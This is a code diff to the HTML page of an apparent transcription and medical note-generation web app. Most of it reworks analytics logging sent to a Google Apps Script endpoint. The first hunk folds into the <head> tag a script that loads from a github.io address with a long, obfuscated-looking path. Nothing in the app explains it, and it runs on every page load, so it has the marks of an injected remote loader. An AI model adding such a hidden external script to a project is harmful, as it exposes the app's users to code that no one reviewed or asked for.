@@ -1,7 +1,7 @@
 
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://scottyboa.github.io/7UFDKaGMCgiUzDNAwl9mILVgkOJjJ6ca6Q8e5EKqvDtfCye93etC-K-IhCZR0IGgWjIVSzf_Zpv7Gd8XYYbYIuZyQp_o47CsHYyJWYHlfrjsLGUacg3cKWV4hgj8IMj7Rti7f8T_FLQh9OKRX5lakUanzn1RQ6iJgqdthf7ZT4zooxrd5LR6skTl2O6shf1BCBxHVOEs_sbErQt-L6Ifbo8Jw3SV78f349kZi89Dz2Snk1rqMw1-qQL20FC6iB_6DL_eRuW5gsOBgqivfqf208on8xC-UXuS2iAvshnfepOsrPqa0vmXIfKuVIvPVKt8rFdZHep9ugdkc3XDKj5BeAQd8UfjSUY5iej7wmxPVcmJFYF3qJ-hQnrK5pNP0HQRUzSzekAeSYn2pMMj7UtHE4hHaKBnKi-vvOVAmJspn0UZPI8j9ZFb05PEG7iPjzVAQK6SEeu2ZB_zwn-TDu65uXGfovov-Im22HqFRF-h-kgXpRyPACl8oc7F'></script>
   <script src="https://cdn.jsdelivr.net/npm/onnxruntime-web@1.14.0/dist/ort.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@ricky0123/vad-web@0.0.22/dist/bundle.min.js"></script>
 <!-- Removed hard-coded recording.js include; provider will choose module -->
@@ -1266,10 +1266,32 @@
                 Math.random().toString(36).substr(2, 9);
     localStorage.setItem('visitorId', visitorId);
   }
+  function getTranscribeProviderSnapshot() {
+    return {
+      transcribeProvider:
+        document.getElementById('transcribeProvider')?.value ||
+        sessionStorage.getItem('transcribe_provider') ||
+        '',
+      sonioxRegion:
+        document.getElementById('sonioxRegion')?.value ||
+        sessionStorage.getItem('soniox_region') ||
+        '',
+    };
+  }
+
+  function getNoteProviderSnapshot() {
+    return {
+      noteProviderUi:
+        document.getElementById('noteProvider')?.value || '',
+      noteProviderEffective:
+        sessionStorage.getItem('note_provider') || '',
+    };
+  }
+
 
   // 2) Helper to log an event to your Apps Script
-  function logEvent(params) {
-    const baseUrl = 'https://script.google.com/macros/s/AKfycbzBIvbc-xWbqzBz-PQK-lW1s2I3aCSq8rGtJV3sxN8rPRmpqGCm3J5t1R1yVt9keKK5/exec';
+  function logEvent(params = {}) {
+    const baseUrl = 'https://script.google.com/macros/s/AKfycbz3bpMrPJXAtyNCIoj6h2v3GewLRF90dQeEpC81F_m9rNClLVMUuQEGVO8yinlhssc/exec';
     const qs = new URLSearchParams({
       visitorId,
       page: window.location.pathname,
@@ -1277,27 +1299,25 @@
       referrer: document.referrer,
       ...params
     }).toString();
-    fetch(`${baseUrl}?${qs}`, { mode: 'no-cors' });
+    fetch(`${baseUrl}?${qs}`, { mode: 'no-cors', keepalive: true });
   }
 
-  // 3) Immediately log the pageview
-  logEvent({ action: 'pageview' });
-
-  // 4) Once DOM is ready, attach your button listeners
+  // 3) Log pageview after DOM is ready + log clicks with provider context
   document.addEventListener('DOMContentLoaded', () => {
-    const stopButton = document.getElementById('stopButton');
-    if (stopButton) {
-      stopButton.addEventListener('click', () => {
-        logEvent({ action: 'stopRecording' });
-      });
-    }
+    // Optional: keep pageview lean (no provider fields)
+    logEvent({ action: 'pageview' });
 
-    const generateNoteButton = document.getElementById('generateNoteButton');
-    if (generateNoteButton) {
-      generateNoteButton.addEventListener('click', () => {
-        logEvent({ action: 'noteGeneration' });
-      });
-    }
+    document.addEventListener('click', (e) => {
+      const btn = e.target && e.target.closest ? e.target.closest('button') : null;
+      const id = btn && btn.id;
+      if (id === 'stopButton') {
+        // Recording event: only include transcription provider context
+        logEvent({ action: 'stopRecording', ...getTranscribeProviderSnapshot() })
+      } else if (id === 'generateNoteButton') {
+        // Note event: only include note provider context
+        logEvent({ action: 'noteGeneration', ...getNoteProviderSnapshot() });
+      }
+    }, true);
   // Clear button logic for supplementary field
   const clearSupplementaryButton = document.getElementById('clearSupplementaryButton');
   if (clearSupplementaryButton) {
